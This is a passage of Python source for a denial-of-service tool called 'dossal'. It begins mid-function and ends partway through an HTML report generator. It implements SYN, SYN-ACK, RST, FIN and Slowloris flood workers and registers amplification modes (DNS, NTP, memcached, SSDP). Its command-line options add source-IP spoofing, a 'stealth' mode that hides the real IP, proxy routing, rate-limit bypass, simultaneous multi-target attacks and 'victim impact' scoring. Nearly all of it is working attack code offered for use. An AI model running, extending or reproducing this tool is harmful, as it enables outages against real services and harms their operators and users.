                getattr(_errno, 'EADDRNOTAVAIL', _errno.EADDRNOTAVAIL)
            ):
                errors += 1
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass
    return conns, errors

async def syn_worker(name, url, stats, duration, stop, payload_size=0):
    """TCP SYN flood 워커: SYN만 전송 (핸드셰이크 미완료)"""
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    # Assign different source IPs to each process
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs)
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_syn_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── SYN-ACK / connect+close (ACK flood) ──────────────────────────
def _mp_synack_flood(args_tuple):
    """멀티프로세스 SYN-ACK/RST 패킷."""
    host, port, duration = args_tuple
    import time as _time
    import errno as _errno
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((host, port))
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET
            ):
                errors += 1
        finally:
            if s:
                try:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 struct.pack('ii', 1, 0))
                    s.close()  # RST
                except Exception:
                    pass
    return conns, errors

async def synack_worker(name, url, stats, duration, stop, payload_size=0):
    """TCP SYN-ACK flood 워커: SYN-ACK만 전송"""
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_synack_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── RST flood: SO_LINGER(0,0) close sends RST ───────────────────
def _mp_rst_flood(args_tuple):
    """멀티프로세스 RST 패킷: 연결, 전송, close (RST)."""
    host, port, duration, payload = args_tuple
    import time as _time
    import errno as _errno
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((host, port))
            s.send(payload)
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            # Connection failed - victim busy, not a real error
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET
            ):
                errors += 1
        finally:
            if s:
                try:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 struct.pack('ii', 1, 0))
                    s.close()
                except Exception:
                    pass
    return conns, errors

async def rst_worker(name, url, stats, duration, stop, payload_size=1):
    """TCP RST flood 워커: RST 패킷 폭주"""
    host, port = parse_ip_port(url)
    payload = b"X" * max(1, payload_size)
    n_procs = _UDP_NPROCS[0]
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_rst_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── FIN flood: connect -> graceful close (FIN) ────────────────────
def _mp_fin_flood(args_tuple):
    """멀티프로세스 FIN 패킷: 연결, 정상 close (FIN)."""
    host, port, duration = args_tuple
    import time as _time
    import errno as _errno
    conns = 0
    errors = 0
    err_types = {}
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except (AttributeError, OSError):
                pass
            s.connect((host, port))
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET,
                getattr(_errno, 'EADDRNOTAVAIL', _errno.EADDRNOTAVAIL)
            ):
                errors += 1
                err_types[getattr(e, 'errno', 'unknown')] = err_types.get(getattr(e, 'errno', 'unknown'), 0) + 1
        finally:
            if s:
                try:
                    import struct as _st
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 _st.pack('ii', 1, 0))  # RST on close
                except Exception:
                    pass
                try:
                    s.close()
                except Exception:
                    pass
    return conns, errors

async def fin_worker(name, url, stats, duration, stop, payload_size=0):
    """TCP FIN flood 워커: FIN 패킷 폭주"""
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_fin_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── Slowloris: open connection, send partial headers slowly ──────
async def slowloris_worker(name, url, stats, duration, stop, payload_size=0):
    """Slowloris 워커: TCP 연결 유지 + 느린 헤더 드립"""
    host, port, path = parse_http(url)
    try:
        reader, writer = await asyncio.open_connection(host, port)
        # Send first partial header line
        writer.write(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n".encode())
        await writer.drain()
        stats.conns += 1
        # Keep alive with periodic headers
        header_count = 0
        while not stop.is_set():
            await asyncio.sleep(0.5)
            if not stop.is_set():
                writer.write(f"X-Header-{header_count}: slow\r\n".encode())
                await writer.drain()
                header_count += 1
                stats.bytes += 30
    except Exception:
        pass
    finally:
        if writer.transport:
            writer.transport.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

# ── Mode registry ─────────────────────────────────────────────────
WORKERS = {
    "http":      http_worker,
    "https":     https_worker,
    "httpsmp":   https_mp_worker,
    "ws":        ws_worker,
    "websocket": ws_worker,
    "tcp":       tcp_worker,
    "udp":       udp_worker,
    "udy":       udp_worker,
    "h2":          h2_worker,
    "h2mp":        h2mp_worker,
    "dns":         dns_worker,
    "icmp":        icmp_worker,
    "ssdp":        ssdp_worker,
    "ntp":         ntp_worker,
    "memcached":   memcached_worker,
    "grpc":      grpc_worker,
    "grpcmp":    grpc_mp_worker,
    "quic":      quic_worker,
    "syn":       syn_worker,
    "synack":    synack_worker,
    "rst":       rst_worker,
    "fin":       fin_worker,
    'slowloris': slowloris_worker,
    'raw': raw_worker,
    'wsm': ws_mp_worker,
    'h3mp': h3mp_worker,
}

DEFAULT_PAYLOADS = {
    "http": 0, "https": 0, "websocket": 128, "tcp": 1024,
    "udp": 1400, "h2": 1024, "grpc": 1024, "quic": 1400, "syn": 0, "synack": 0,
    "rst": 1, "fin": 0, "slowloris": 0,
}

# ═══════════════════════════════════════════════════════════════════
# IMPACT SCORING
# ═══════════════════════════════════════════════════════════════════

async def _find_pid(port):
    """포트监听 PID 검색 (lsof, 폴백 ps)."""
    loop = asyncio.get_event_loop()
    try:
        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
            ['lsof', f'-i:{port}', '-t'], capture_output=True, text=True, timeout=5).stdout)
        pid_str = out.strip().split('\n')[0].strip()
        if pid_str.isdigit():
            return int(pid_str)
    except Exception:
        pass
    # Fallback: scan ps for python/node processes
    try:
        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
            ['ps', '-eo', 'pid,command'], capture_output=True, text=True, timeout=5).stdout)
        for line in out.splitlines():
            parts = line.split(None, 1)
            if len(parts) == 2 and ('victim' in parts[1] or 'cf-sim' in parts[1] or 'server.py' in parts[1]):
                # Check if this process has the port (best effort: pick first match)
                return int(parts[0])
    except Exception:
        pass
    return None

class CpuSampler:
    """프로세스 CPU% 백그라운드 샘플링 (psutil)."""
    def __init__(self, pid):
        self.pid = pid
        self.samples = []
        self._task = None
    async def start(self):
        import psutil
        try:
            self._proc = psutil.Process(self.pid)
            self._proc.cpu_percent(None)  # prime
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            self._proc = None
            return
        loop = asyncio.get_event_loop()
        async def _sample():
            while True:
                await asyncio.sleep(0.2)
                if self._proc:
                    cpu = await loop.run_in_executor(None, self._proc.cpu_percent, None)
                    self.samples.append(cpu)
        self._task = asyncio.create_task(_sample())
    async def stop(self):
        if self._task:
            self._task.cancel()
        if self.samples:
            return sum(self.samples) / len(self.samples)
        return 0.0

async def impact_score(url, stats, duration, sampler=None, base_cpu=0.0):
    """피해 임팩트 점수 계산. psutil 호출 전부 executor에서."""
    loop = asyncio.get_event_loop()
    host, port = parse_ip_port(url)

    def _get_pid():
        try:
            out = __import__('subprocess').run(
                ['lsof', f'-i:{port}', '-t'],
                capture_output=True, text=True, timeout=5).stdout
            pid_str = out.strip().split('\n')[0].strip()
            return int(pid_str) if pid_str.isdigit() else None
        except Exception:
            return None

    def _sample(pid):
        import psutil
        try:
            proc = psutil.Process(pid)
            mem = proc.memory_info().rss
            return mem
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return 0

    victim_pid = await loop.run_in_executor(None, _get_pid)
    if not victim_pid:
        return {"victim_pid": None, "note": "PID not found"}

    # Sample victim mem
    mem_bytes = await loop.run_in_executor(None, _sample, victim_pid)

    rps = stats.rps(duration)
    # CPU: use background sampler, subtract baseline
    if sampler:
        cpu_raw = await sampler.stop()
        cpu = max(0.0, cpu_raw - base_cpu)
    else:
        base_cpu = 0.0
        # Fallback: quick sample
        def _cpu():
            import psutil
            try:
                p = psutil.Process(victim_pid)
                p.cpu_percent(None)
                import time as _t
                _t.sleep(0.3)
                return p.cpu_percent(None)
            except Exception:
                return 0
        cpu = await loop.run_in_executor(None, _cpu)

    score = 0
    score += min(cpu, 100) * 0.5
    score += min(mem_bytes / 1024 / 1024 / 10, 50)
    if rps > 0:
        score += min(rps / 1000, 25)

    return {
        "victim_pid": victim_pid,
        "victim_cpu_pct": round(cpu, 1),
        "victim_mem_mb": round(mem_bytes / 1024 / 1024, 1),
        "rps": round(rps, 1),
        "impact_score": round(score, 1),
    }

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_conns=None):
    """dossal 메인 실행: 모드 선택, 타임아웃, 결과 출력"""
    if mode_conns is None:
        mode_conns = {}
    stop = asyncio.Event()
    async def finish():
        await asyncio.sleep(duration); stop.set()
    task = asyncio.create_task(finish())
    workers = []
    # Split process budget among L4 multiproc modes
    MULTIPROC_ALL = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'grpcmp', 'httpsmp'}
    l4_modes = [m for m in modes if m in MULTIPROC_ALL]
    n_l4 = len(l4_modes)
    if n_l4 > 1:
        # Distribute _UDP_NPROCS across multiproc modes
        per_mode = max(1, _UDP_NPROCS[0] // n_l4)
        _UDP_NPROCS[0] = per_mode
    
    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'h3mp', 'dns', 'icmp', 'ssdp', 'ntp', 'memcached'}
    for mode in modes:
        worker_fn = WORKERS[mode]
        pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
        # Per-mode connection count
        eff_conns = mode_conns.get(mode, conns)
        if mode in MULTIPROC_MODES and eff_conns > 1 and mode not in mode_conns:
            eff_conns = 1  # multiproc modes: 1 worker (procs controlled by --threads)
        for i in range(eff_conns):
            workers.append(asyncio.create_task(worker_fn(i, url, stats, duration, stop, pl)))
    try:
        await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=duration + 5)
    except (asyncio.TimeoutError, Exception):
        pass
    stop.set()
    if not task.done():
        task.cancel()
    return stats

def auto_probe(url):
    """프로토콜 자동 감지: https:443 -> http:80 순서 probe"""
    from urllib.parse import urlparse
    import socket as _sock
    parsed = urlparse(url)
    
    # If no scheme, try https first then http
    if not parsed.scheme:
        # Try https:443
        host = parsed.netloc.split(':')[0]
        try:
            s = _sock.create_connection((host, 443), timeout=2)
            s.close()
            return auto_probe(f"https://{host}:443")
        except Exception:
            pass
        # Try http:80
        return auto_probe(f"http://{host}:80")
    
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    scheme = parsed.scheme or 'http'
    
    results = {'host': host, 'port': port, 'scheme': scheme, 'protocols': [], 'recommended': []}

    # TCP connect test
    try:
        s = _sock.create_connection((host, port), timeout=2)
        s.close()
        results['protocols'].append('tcp')
    except Exception:
        results['error'] = f'TCP connect failed: {host}:{port}'
        return results

    # HTTP test
    try:
        if scheme == 'https':
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = _sock.create_connection((host, port), timeout=2)
            ss = ctx.wrap_socket(s, server_hostname=host)
            ss.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            data = ss.recv(4096)
            ss.close()
        else:
            s = _sock.create_connection((host, port), timeout=2)
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            data = s.recv(4096)
            s.close()
        if b'HTTP/' in data:
            results['protocols'].append('http')
            if b'HTTP/2' in data or b'h2' in data:
                results['protocols'].append('h2')
            if scheme == 'https':
                results['recommended'].append('httpsmp')  # HTTPS multiproc
            else:
                results['recommended'].append('raw')  # raw HTTP multiproc
    except Exception:
        pass

    # Check for ALPN h2
    if scheme == 'https':
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
            s = _sock.create_connection((host, port), timeout=2)
            ss = ctx.wrap_socket(s, server_hostname=host)
            neg = ss.selected_alpn_protocol()
            ss.close()
            if neg == 'h2':
                if 'h2' not in results['protocols']:
                    results['protocols'].append('h2')
                if 'h2' not in results['recommended']:
                    results['recommended'].insert(0, 'h2')
        except Exception:
            pass

    # Deduplicate recommended, preserving order
    results['recommended'] = list(dict.fromkeys(results['recommended']))
    # If h2 is recommended, remove duplicate http/https (h2 covers both)
    if 'h2' in results['recommended']:
        results['recommended'] = [m for m in results['recommended'] if m not in ('http', 'https', 'httpsmp')]
        if 'h2' not in results['recommended']:
            results['recommended'].insert(0, 'h2')
        if 'grpcmp' not in results['recommended']:
            results['recommended'].append('grpcmp')

    # Default recommendation if nothing detected
    if not results['recommended']:
        results['recommended'] = ['raw', 'udp', 'syn']

    return results

def main():
    """CLI 파싱 + run() 호출"""
    ap = argparse.ArgumentParser(
        description="dossal v" + VERSION + " - comprehensive DoS stress engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Single mode
  dossal --mode raw --url http://target:8080 --threads 8 --duration 30

  # Auto-detect + optimal modes
  dossal --auto --url https://target:443 --duration 30 --live

  # Combo presets
  dossal --combo web --url http://target:8080 --duration 30
  dossal --combo tls --url https://target:443 --duration 30
  dossal --combo proto --url https://target:50051 --duration 30

  # Multi-mode with per-mode tuning
  dossal --mode raw,udp,syn --url http://target:8080 --threads 12 --duration 30

  # With HTML report + impact scoring
  dossal --mode raw --url http://target:8080 --duration 10 --report out.html --impact
""")
    ap.add_argument("--mode", default="http",
        help="Comma-separated modes: http,https,httpsmp,raw,h2,grpc,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris")
    ap.add_argument("--auto", action="store_true",
        help="Auto-detect target protocol and select optimal modes")
    ap.add_argument("--combo", default=None,
        choices=['web', 'full', 'tls', 'proto', 'amplify'],
        help="Preset mode combo: web(raw+udp+syn), full(+rst), tls(httpsmp+h2+udp), proto(grpcmp+h2+udp), amplify(dns+icmp+ssdp+ntp+memcached)")
    ap.add_argument("--url", required=True)
    ap.add_argument("--targets", default=None,
        help="Comma-separated multiple target URLs (attack all simultaneously). Overrides --url")
    ap.add_argument("--connections", type=int, default=100,
        help="Connections per mode (default: 100)")
    ap.add_argument("--conns", default=None,
        help='Per-mode connection overrides: "http=400,h2=80,udp=1,syn=10"')
    ap.add_argument("--duration", type=int, default=10)
    ap.add_argument("--payload-size", type=int, default=None,
        help="Override default payload size (per mode)")
    ap.add_argument("--impact", action="store_true",
        help="Enable victim impact scoring (requires psutil)")
    ap.add_argument("--intensity", default="balanced",
        choices=["light", "balanced", "max"],
        help="Preset: light(10c), balanced(50c), max(200c). Overrides default 100c.")
    ap.add_argument("--live", action="store_true",
        help="Print RPS/PPS every second during attack")
    ap.add_argument("--report", default=None, metavar="FILE",
        help="Generate HTML attack report to FILE")
    ap.add_argument("--threads", type=int, default=None,
        help="Multiprocess count (default: auto, max 32)")
    ap.add_argument("--src-ips", default=None,
        help="Comma-separated source IPs to rotate (per-IP rate limit bypass). 'auto' = detect all local IPs")
    ap.add_argument("--spoof", type=int, default=0,
        help="Generate N spoofed source IPs (RFC 5737 TEST-NET, unclaimed). Hides real IP, bypasses per-IP rate limit")
    ap.add_argument("--stealth", action="store_true",
        help="Stealth mode: only use spoofed IPs, never expose real IP")
    ap.add_argument("--jitter", type=float, default=0.0, metavar="MS",
        help="Random delay between requests in ms (0 = max speed, 5 = ~5ms jitter)")
    ap.add_argument("--rotate-interval", type=float, default=5.0, metavar="SEC",
        help="Seconds between IP rotation checks in stealth mode (default: 5s)")
    ap.add_argument("--recovery", action="store_true",
        help="Auto-recovery: detect 429 responses, remove blocked IPs, continue with remaining")
    ap.add_argument("--pool", default=None, metavar="FILE",
        help="File with source IPs (one per line, or host:port for proxy pool)")
    ap.add_argument("--proxy", default=None, metavar="URL",
        help="Proxy URL: http://host:port or socks5://user:pass@host:port. All traffic routes through proxy (hides real IP)")
    ap.add_argument("--dry-run", action="store_true",
        help="Simulate: probe target, show predicted RPS/IP count, don't attack")
    args = ap.parse_args()

    # Auto mode: probe target + always include L4 for max destruction
    # Combo presets
    COMBOS = {
        'web': 'raw,udp,syn',
        'full': 'raw,udp,syn,rst',
        'tls': 'httpsmp,h2,udp',
        'proto': 'grpcmp,h2,udp',
        'amplify': 'dns,icmp,ssdp,ntp,memcached',
    }
    if args.combo:
        args.mode = COMBOS[args.combo]
        print(f"[combo] {args.combo} -> {args.mode}", file=sys.stderr)
    
    # Dry-run: probe and predict, don't attack
    if args.dry_run:
        probe = auto_probe(args.url)
        n_procs = max(1, min(32, args.threads or 8))
        spoof_n = args.spoof if args.spoof > 0 else (100 if args.stealth else 1)
        # Predict RPS based on mode
        mode_pred = {
            'raw': 143000, 'httpsmp': 103000, 'h2': 45000,
            'http': 85000, 'udp': 378000, 'quic': 378000,
            'syn': 16000, 'fin': 16000, 'rst': 12000,
            'grpcmp': 12000, 'wsm': 771000,
        }
        modes = args.mode.split(',')
        total_rps = 0
        for m in modes:
            m = m.strip()
            total_rps += mode_pred.get(m, 50000)
        print(f"[dry-run] Target: {probe['host']}:{probe['port']} ({probe['scheme']})", file=sys.stderr)
        print(f"[dry-run] Modes: {args.mode}", file=sys.stderr)
        print(f"[dry-run] Threads: {n_procs}", file=sys.stderr)
        print(f"[dry-run] Spoofed IPs: {spoof_n}", file=sys.stderr)
        print(f"[dry-run] Stealth: {'ON' if args.stealth else 'OFF'}", file=sys.stderr)
        print(f"[dry-run] Recovery: {'ON' if args.recovery else 'OFF'}", file=sys.stderr)
        print(f"[dry-run] Predicted: ~{total_rps:,} RPS (combined)", file=sys.stderr)
        print(f"[dry-run] Per-IP limit bypass: {spoof_n} IPs × 1000 RPS = {spoof_n * 1000:,} RPS max", file=sys.stderr)
        print(f"[dry-run] NO ATTACK SENT - remove --dry-run to start", file=sys.stderr)
        import sys as _sys
        _sys.exit(0)

    # Initialize proxy
    if args.proxy:
        _PROXY[0] = args.proxy
        print(f"[proxy] routing through {args.proxy}", file=sys.stderr)
    
    # Initialize source IP rotation / spoofing
    _RECOVERY[0] = args.recovery
    _JITTER[0] = args.jitter / 1000.0
    _ROTATE_INTERVAL[0] = args.rotate_interval
    if args.stealth:
        _SPOOF_MODE[0] = True
    
    if args.spoof > 0:
        # Generate spoofed IPs (unclaimed TEST-NET)
        _SRC_IPS[0] = _generate_spoof_ips(args.spoof)  # type: ignore
        _SPOOF_MODE[0] = True
        print(f"[spoof] {len(_SRC_IPS[0])} spoofed IPs generated (TEST-NET 203.0.113.0/24)", file=sys.stderr)
        if args.recovery:
            print(f"[recovery] enabled - will auto-replace IPs that get 429", file=sys.stderr)
    elif args.pool:
        # Load IPs from pool file
        try:
            with open(args.pool) as f:
                ips = [line.strip().split(':')[0] for line in f if line.strip()]
            _SRC_IPS[0] = ips  # type: ignore
            print(f"[pool] loaded {len(ips)} IPs from {args.pool}", file=sys.stderr)
        except Exception as e:
            print(f"[pool] error: {e}", file=sys.stderr)
    elif args.src_ips:
        if args.src_ips == 'auto':
            _SRC_IPS[0] = _detect_local_ips()  # type: ignore
        else:
            _SRC_IPS[0] = [ip.strip() for ip in args.src_ips.split(',') if ip.strip()]
        print(f"[src-ips] rotating {len(_SRC_IPS[0])} IPs: {_SRC_IPS[0]}", file=sys.stderr)

    if args.auto:
        probe = auto_probe(args.url)
        print(f"[auto] target: {probe['host']}:{probe['port']} ({probe['scheme']})", file=sys.stderr)
        print(f"[auto] detected: {', '.join(probe.get('protocols', ['?']))}", file=sys.stderr)
        auto_modes = probe.get('recommended', ['http'])
        
        # Smart mode selection based on detected protocols
        port = probe.get('port', 80)
        scheme = probe.get('scheme', 'http')
        
        # L7: strongest modes for HTTP/HTTPS targets
        if scheme in ('http', 'https'):
            for m in ['raw', 'httpsmp', 'h2mp']:
                if m not in auto_modes:
                    auto_modes.append(m)
        
        # L4: always add for maximum impact
        for l4 in ['udp', 'syn', 'rst']:
            if l4 not in auto_modes:
                auto_modes.append(l4)
        
        # Amplification: add for UDP-friendly targets
        # These work best when target has UDP service or is behind a proxy
        for amp in ['dns', 'icmp']:
            if amp not in auto_modes:
                auto_modes.append(amp)
        
        # Deduplicate, preserve order
        auto_modes = list(dict.fromkeys(auto_modes))
        print(f"[auto] using: {', '.join(auto_modes)} ({len(auto_modes)} modes)", file=sys.stderr)
        args.mode = ','.join(auto_modes)
        
        # Set per-mode optimal connections/threads for auto
        _AUTO_CONNS = {
            'http': 200, 'raw': 1, 'https': 50, 'httpsmp': 1, 'h2': 300, 'h2mp': 1,
            'grpc': 50, 'grpcmp': 1, 'udp': 1, 'quic': 1, 'syn': 1, 'rst': 1,
            'tcp': 1, 'wsm': 1, 'dns': 1, 'icmp': 1, 'ssdp': 1, 'ntp': 1, 'memcached': 1,
        }
        auto_conn_parts = [f"{m}={_AUTO_CONNS.get(m, 50)}" for m in auto_modes]
        if args.conns:
            args.conns = args.conns + ',' + ','.join(auto_conn_parts)
        else:
            args.conns = ','.join(auto_conn_parts)

    modes = list(dict.fromkeys(m.strip() for m in args.mode.split(",")))  # dedupe, preserve order
    for m in modes:
        if m not in WORKERS:
            print(f"Unknown mode: {m}. Available: {', '.join(WORKERS.keys())}", file=sys.stderr)
            sys.exit(1)

    # Intensity preset: overrides default 100 connections
    _INTENSITY = {"light": 10, "balanced": 50, "max": 400}
    if args.connections == 100:
        args.connections = _INTENSITY.get(args.intensity, 50)

    # UDP/QUIC: set process count from --threads
    global _UDP_NPROCS
    if args.threads:
        _UDP_NPROCS[0] = max(1, min(32, args.threads))
    else:
        _UDP_NPROCS[0] = 4  # default: 4 processes

    # Per-mode connection overrides
    mode_conns = {}
    if args.conns:
        for part in args.conns.split(','):
            if '=' in part:
                m, c = part.split('=', 1)
                mode_conns[m.strip()] = int(c.strip())

    stats = Stats()
    payload_size = args.payload_size

    async def _run_all():
        sampler = None
        baseline_cpu = 0.0
        if args.impact:
            host, port = parse_ip_port(args.url)
            victim_pid = await _find_pid(port)
            if victim_pid:
                # Pre-attack baseline
                import psutil
                try:
                    _p = psutil.Process(victim_pid)
                    _p.cpu_percent(None)
                    await asyncio.sleep(0.5)
                    baseline_cpu = _p.cpu_percent(None)
                except Exception:
                    baseline_cpu = 0.0
                sampler = CpuSampler(victim_pid)
                await sampler.start()

        live_task = None
        if args.live:
            _live_start = None
            async def _live_printer():
                nonlocal _live_start
                _live_start = asyncio.get_event_loop().time()
                last_req, last_pkt = 0, 0
                last_t = asyncio.get_event_loop().time()
                while True:
                    await asyncio.sleep(1)
                    now = asyncio.get_event_loop().time()
                    dt = now - last_t
                    rps = (stats.requests - last_req) / dt
                    pps = (stats.packets - last_pkt) / dt
                    elapsed = now - _live_start
                    remaining = max(0, args.duration - int(elapsed))
                    parts = [f"[{remaining}s] RPS={rps:,.0f}"]
                    if stats.ws_msgs: parts.append(f"WS={stats.ws_msgs:,}")
                    if stats.packets: parts.append(f"PPS={pps:,.0f}")
                    if stats.conns: parts.append(f"CONNS={stats.conns}")
                    parts.append(f"ERR={stats.errors}")
                    if _BLOCKED_IPS:
                        parts.append(f"429_IP={len(_BLOCKED_IPS)}")
                        if _SRC_IPS[0]:
                            parts.append(f"ACTIVE={_active_ip_count()}/{len(_SRC_IPS[0])}")
                    print("  " + "  ".join(parts), flush=True)
                    last_req, last_pkt, last_t = stats.requests, stats.packets, now
            live_task = asyncio.create_task(_live_printer())

        if args.targets:
            # Multi-target: attack all targets simultaneously
            target_urls = [t.strip() for t in args.targets.split(',') if t.strip()]
            print(f"[multi] attacking {len(target_urls)} targets simultaneously", file=sys.stderr)
            # Split threads across targets
            per_target = max(1, args.threads // len(target_urls)) if args.threads else max(1, 8 // len(target_urls))
            tasks = []
            for i, turl in enumerate(target_urls):
                print(f"[multi] target {i+1}/{len(target_urls)}: {turl}", file=sys.stderr)
                tasks.append(run(modes, turl, args.connections, args.duration, stats, payload_size, args, mode_conns))
            # Reduce threads per target for multi-target
            if _UDP_NPROCS[0] > per_target:
                _UDP_NPROCS[0] = per_target
            await asyncio.gather(*tasks)
        else:
            await run(modes, args.url, args.connections, args.duration, stats, payload_size, args, mode_conns)
        if live_task:
            live_task.cancel()
        report = stats.report(modes, args.url if not args.targets else args.targets, args.connections, args.duration)
        if args.impact:
            report["impact"] = await impact_score(args.url, stats, args.duration, sampler, baseline_cpu)
        return report

    report = asyncio.run(_run_all())
    print(json.dumps(report, indent=2))
    if args.report:
        _generate_report(args.report, report, args)

def _generate_report(path, report, args):
    """HTML 공격 리포트 생성."""
    import datetime
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rps = report.get("rps", 0)
    pps = report.get("pps", 0)
    conns = report.get("connections_made", 0)
    errors = report.get("errors", 0)
    duration = report.get("duration_s", 0)
    url = report.get("url", "?")
    ver = report.get("version", "?")
    modes = ", ".join(report.get("modes", []))
    byts = report.get("bytes", 0)
    bps = report.get("bps", 0)
    html = (
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<title>dossal Report</title><style>"
        "body{font-family:system-ui;max-width:800px;margin:40px auto;padding:0 20px;background:#1a1a2e;color:#eee}"
        "h1{color:#e94560}.card{background:#16213e;border-radius:12px;padding:20px;margin:16px 0}"
        ".stat{display:inline-block;margin-right:30px}.val{font-size:2em;font-weight:bold;color:#fff;background:#e94560;padding:4px 12px;border-radius:8px}"
        "table{width:100%;border-collapse:collapse}th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #333}th{color:#e94560}"
        "</style></head><body>"
        "<h1>\u26a1 dossal Attack Report</h1>"
        "<div class='card'>"
        f"<div class='stat'><div class='val'>{rps:,.0f}</div><div>RPS</div></div>"
        f"<div class='stat'><div class='val'>{pps:,.0f}</div><div>PPS</div></div>"
        f"<div class='stat'><div class='val'>{conns:,.0f}</div><div>Conns</div></div>"
        f"<div class='stat'><div class='val'>{errors:,.0f}</div><div>Errors</div></div>"
        f"<div class='stat'><div class='val'>{duration}s</div><div>Duration</div></div>"
        "</div>"
        f"<div class='card'><h3>Modes</h3><p>{modes}</p></div>"
        f"<div class='card'><h3>Performance</h3>"
        f"<div style='margin:8px 0'><span style='color:#e94560'>RPS</span> "
        f"<div style='background:#333;border-radius:4px;height:24px;overflow:hidden'>"
        f"<div style='background:#e94560;height:100%;width:{min(100, rps/1000):.1f}%;display:flex;align-items:center;padding-left:8px;font-size:12px'>{rps:,.0f}</div></div></div>"
        f"<div style='margin:8px 0'><span style='color:#0f3460'>PPS</span> "
        f"<div style='background:#333;border-radius:4px;height:24px;overflow:hidden'>"
        f"<div style='background:#0f3460;height:100%;width:{min(100, pps/5000):.1f}%;display:flex;align-items:center;padding-left:8px;font-size:12px'>{pps:,.0f}</div></div></div>"
        f"<div style='margin:8px 0'><span style='color:#533483'>Conns</span> "
        f"<div style='background:#333;border-radius:4px;height:24px;overflow:hidden'>"
        f"<div style='background:#533483;height:100%;width:{min(100, conns/500):.1f}%;display:flex;align-items:center;padding-left:8px;font-size:12px'>{conns:,.0f}</div></div></div>"
        f"</div>"
